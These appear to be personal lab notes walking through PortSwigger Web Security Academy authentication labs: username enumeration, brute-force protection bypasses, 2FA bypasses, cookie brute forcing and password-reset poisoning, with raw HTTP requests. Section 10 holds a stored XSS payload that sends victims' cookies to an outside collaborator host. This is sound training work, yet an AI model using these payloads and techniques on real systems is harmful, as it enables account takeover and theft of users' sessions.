---
tags:
  - authn
  - username-enum
---
# Authentication Labs
## 1. Username enumeration via different responses

1. Try logging in with generic credentials like `tester:password` and notice the response contains the string "Invalid username"
2. Send the login request to intruder and set a placeholder on the username
3. Run the attack and filter by responses that do not contain that string
4. Notice the following request does not result in the common error

```
POST /login HTTP/1.1
Host: 0aeb001104ec463c82f78345004700df.web-security-academy.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:147.0) Gecko/20100101 Firefox/147.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/x-www-form-urlencoded
Content-Length: 36
Origin: https://0aeb001104ec463c82f78345004700df.web-security-academy.net
Connection: close
Referer: https://0aeb001104ec463c82f78345004700df.web-security-academy.net/login
Cookie: session=zr9XUeC8t6mXRGjonvw17G8t3c1bgkDa
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
X-PwnFox-Color: blue
Priority: u=0, i

username=affiliate&password=password
```

5. Now we can brute force the password for that user
6. Note that incorrect attempts contain the message "Incorrect password"

![[attachments/authn-labs/file-20260206135415806.png]]

7. Log in with the recovered password to solve the lab

## 2. Username enumeration via subtly different responses

1. Try logging in with generic credentials and note the error message

![[attachments/authn-labs/file-20260206135415813.png]]

2. Note the slight difference in the response with username "argentina"

![[attachments/authn-labs/file-20260206135415821.png]]

3. Brute force passwords for the "argentina" user

```
POST /login HTTP/1.1
Host: 0a040031047729f880d9c6bb00900001.web-security-academy.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:147.0) Gecko/20100101 Firefox/147.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/x-www-form-urlencoded
Content-Length: 35
Origin: https://0a040031047729f880d9c6bb00900001.web-security-academy.net
Connection: close
Referer: https://0a040031047729f880d9c6bb00900001.web-security-academy.net/login
Cookie: session=iU1mNC9RlDWaFvH9hEyrVZ3jFsJ1DttN
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
X-PwnFox-Color: blue
Priority: u=0, i

username=argentina&password=chelsea
```

## 3. Username enumeration via response timing

1. Log in with our own credentials and note the response time (~567ms)
2. Send a valid username (wiener) with a very long, incorrect password and observe the response time (~5359ms)
3. Note that we get an error about making too many requests. "You have made too many incorrect login attempts. Please try again in 30 minute(s)."
4. Set an `X-Forwarded-For` header and set a placeholder at the last octet
5. Run the attack again with the usernames and a long password. 

![[attachments/authn-labs/file-20260206135415827.png]]

6. Run the same attack with a placeholder on the password field and look for the 302 response

![[attachments/authn-labs/file-20260206135415829.png]]

7. Log in as the discovered user to solve the lab

## 4. Broken brute-force protection, IP block

1. Create the necessary payloads with the following commands

```
seq 100 | xargs -I{} echo 'carlos' > carlos-username.txt
```

```
sed '2~2a wiener' carlos-username.txt > ip-bypass-usernames.txt
```

```
sed '2~2a peter' portswigger-passwords.txt > ip-bypass-passwords.txt
```

2. Run the attack again with the updated payloads

![[attachments/authn-labs/file-20260206135415831.png]]

3. Log in with the recovered password to solve the lab

## 5. Username enumeration via account lock

1. Send a login with generic credentials and note the incorrect username or password error
2. Send the request to intruder and set placeholders on the username and password. 
3. Create a list of 5-6 passwords that will be tested for each user. 
4. Note different responses and find that one of the accounts gets locked out.

![[attachments/authn-labs/file-20260206135415838.png]]

5. Run another attack with intruder and notice that one of the passwords does not cause an error

![[attachments/authn-labs/file-20260206135415849.png]]

6. Wait a minute and then log in with that password to solve the lab

## 6. Broken brute-force protection, multiple credentials per request

1. Send credentials and note the error message
2. Observe the JSON POST body

```
POST /login HTTP/1.1
Host: 0acd008e04e9fb8381b666b100090033.web-security-academy.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:147.0) Gecko/20100101 Firefox/147.0
Accept: */*
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br, zstd
Referer: https://0acd008e04e9fb8381b666b100090033.web-security-academy.net/login
Content-Type: application/json
Content-Length: 43
Origin: https://0acd008e04e9fb8381b666b100090033.web-security-academy.net
Connection: keep-alive
Cookie: session=bvbKWtuejrGqsASmkVwVTTMAYbKFdS5Y
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
X-PwnFox-Color: blue
Priority: u=0

{"username":"carlos","password":"password"}
```

3. Replace the password value with an array containing all candidate passwords

```
POST /login HTTP/1.1
Host: 0acd008e04e9fb8381b666b100090033.web-security-academy.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:147.0) Gecko/20100101 Firefox/147.0
Accept: */*
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br, zstd
Referer: https://0acd008e04e9fb8381b666b100090033.web-security-academy.net/login
Content-Type: application/json
Content-Length: 43
Origin: https://0acd008e04e9fb8381b666b100090033.web-security-academy.net
Connection: keep-alive
Cookie: session=bvbKWtuejrGqsASmkVwVTTMAYbKFdS5Y
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
X-PwnFox-Color: blue
Priority: u=0

{"username":"carlos","password":["123456",
"password",
"12345678",
"qwerty",
"123456789",
"12345",
"1234",
"111111",
"1234567",
"dragon",
"123123",
"baseball",
"abc123",
"football",
"monkey",
"letmein",
"shadow",
"master",
"666666",
"qwertyuiop",
"123321",
"mustang",
"1234567890",
"michael",
"654321",
"superman",
"1qaz2wsx",
"7777777",
"121212",
"000000",
"qazwsx",
"123qwe",
"killer",
"trustno1",
"jordan",
"jennifer",
"zxcvbnm",
"asdfgh",
"hunter",
"buster",
"soccer",
"harley",
"batman",
"andrew",
"tigger",
"sunshine",
"iloveyou",
"2000",
"charlie",
"robert",
"thomas",
"hockey",
"ranger",
"daniel",
"starwars",
"klaster",
"112233",
"george",
"computer",
"michelle",
"jessica",
"pepper",
"1111",
"zxcvbn",
"555555",
"11111111",
"131313",
"freedom",
"777777",
"pass",
"maggie",
"159753",
"aaaaaa",
"ginger",
"princess",
"joshua",
"cheese",
"amanda",
"summer",
"love",
"ashley",
"nicole",
"chelsea",
"biteme",
"matthew",
"access",
"yankees",
"987654321",
"dallas",
"austin",
"thunder",
"taylor",
"matrix",
"mobilemail",
"mom",
"monitor",
"monitoring",
"montana",
"moon",
"moscow"]}
```

4. Send that request (view in browser) to log in as carlos to solve the lab

## 7. 2FA simple bypass

1. Log in with our credentials and make note of the entire login flow
2. Observe that after entering the MFA code, we're redirected to `/my-account`
3. Log out and enter carlos' credentials
4. When prompted for carlos' MFA code, try navigating directly to the following URL

```
https://0a6f005403346d0b8131115d00e500b9.web-security-academy.net/my-account?id=carlos
```

5. That works and the lab is solved

## 8. 2FA broken logic

1. Log in with our own credentials and make note of the full auth flow
2. Make specific note of the verify cookie where the username is passed
3. Log out of our account
4. Send the `GET` request to `/login2` to repeater and change the value of the verify cookie to carlos. This will generate an MFA token for carlos
5. Now enter our credentials again, but enter an invalid MFA token. Then, send that request to intruder
6. Change the verify value to carlos
7. Set a placeholder on the MFA token and run the attack. Note the 302 response
8. View that request in the browser to log in as carlos and solve the lab

## 9. Brute-forcing a stay-logged-in cookie

1. Log in with our credentials. Note the response...there is a stay-logged-in cookie that is set.

![[attachments/authn-labs/file-20260206135415852.png]]

2. This is a base64-encoded string

![[attachments/authn-labs/file-20260206135415854.png]]

3. Send the GET request to the `/my-account` endpoint to intruder
4. Change the value of the id to carlos
5. Delete the session cookie and set a placeholder around the stay-logged-in cookie
6. Set the configuration as follows

![[attachments/authn-labs/file-20260206135415856.png]]

7. Run the attack and sort by length. 
8. Find the stand-out request and request in the browser to log in as carlos and solve the lab

## 10. Placeholder

1. Find the XSS on the the blog post comment section
2. Send the following XSS payload which will exfil the cookie for any user who visit the page

```
test<img src=x onerror=fetch('https://er9rqkcmn0c5wtizuc0xw10ci3ouck09.oastify.com/x?cookie='+btoa(document.cookie))>
```

3. Check collaborator for connections

![[attachments/authn-labs/file-20260206135415859.png]]

4. Decode the cookie

![[attachments/authn-labs/file-20260206135415861.png]]

5. Put the MD5 hash into crackstation or hashcat

![[attachments/authn-labs/file-20260206135415862.png]]

6. Log in as carlos and delete the account to solve the lab

## 11. Password reset broken logic

1. Reset our own password, note the email contains a URL with a reset token
2. Send the password reset request to repeater
3. Remove the value of the token from the URL and the POST request body

```
POST /forgot-password?temp-forgot-password-token= HTTP/2
Host: 0a4b0031048ad38c809899b8000c00c7.web-security-academy.net
Cookie: session=NEC4WSA9XiHeEgTdbLVf5kiNhAWYHr2Q
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:147.0) Gecko/20100101 Firefox/147.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 91
Origin: https://0a4b0031048ad38c809899b8000c00c7.web-security-academy.net
Referer: https://0a4b0031048ad38c809899b8000c00c7.web-security-academy.net/forgot-password?temp-forgot-password-token=vkkwebk54pnfjev3upnuct7ril2wb1ox
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

temp-forgot-password-token=&username=carlos&new-password-1=password&new-password-2=password
```

4. Change the username to carlos
5. Log in as carlos with the new password to solve the lab

## 12. Password reset poisoning via middleware

1. Go through the whole forgot password flow and notice it consists of two steps
2. Send the POST request to `/forgot-password` to repeater
3. Change the name to carlos
4. Add a `X-Forwarded-For` header with the URL of the exploit server
5. Send that request

```
POST /forgot-password HTTP/2
Host: 0a15009d045829e5823ae314008300a0.web-security-academy.net
Cookie: session=G0W2J3ZoSC759blldhb4sENIJkv0O3RN
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:147.0) Gecko/20100101 Firefox/147.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 15
Origin: https://0a15009d045829e5823ae314008300a0.web-security-academy.net
Referer: https://0a15009d045829e5823ae314008300a0.web-security-academy.net/forgot-password
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
X-Forwarded-Host: exploit-0a1e006804a429ec82d1e2fc013800c9.exploit-server.net/

username=carlos
```

6. Check the access log on the exploit server and find the reset token

 ![[attachments/authn-labs/file-20260206135415864.png]]

7. Put that token into the POST request to `/forgot-password` as follows:

```
POST /forgot-password?temp-forgot-password-token=j9yregvafht46do2s73u9s8irldcm34m HTTP/2
Host: 0a15009d045829e5823ae314008300a0.web-security-academy.net
Cookie: session=G0W2J3ZoSC759blldhb4sENIJkv0O3RN
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:147.0) Gecko/20100101 Firefox/147.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 107
Origin: https://0a15009d045829e5823ae314008300a0.web-security-academy.net
Referer: https://0a15009d045829e5823ae314008300a0.web-security-academy.net/forgot-password?temp-forgot-password-token=sr07j0eg96ix6z4m2kfsny6ily3e69v3
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

temp-forgot-password-token=j9yregvafht46do2s73u9s8irldcm34m&new-password-1=password&new-password-2=password
```

8. Log in as carlos with the new password to solve the lab

## 13. Password brute-force via password change

1. Try setting a new password with two new passwords that don't match. 
2. Note the difference in messages between sending an invalid current password and sending a correct password but two new passwords that don't match.
3. Send the reset request to intruder and set a placeholder around the current password. Ensure that the two new passwords don't match. 

![[attachments/authn-labs/file-20260206135415865.png]]

4. Log in as carlos to solve the lab

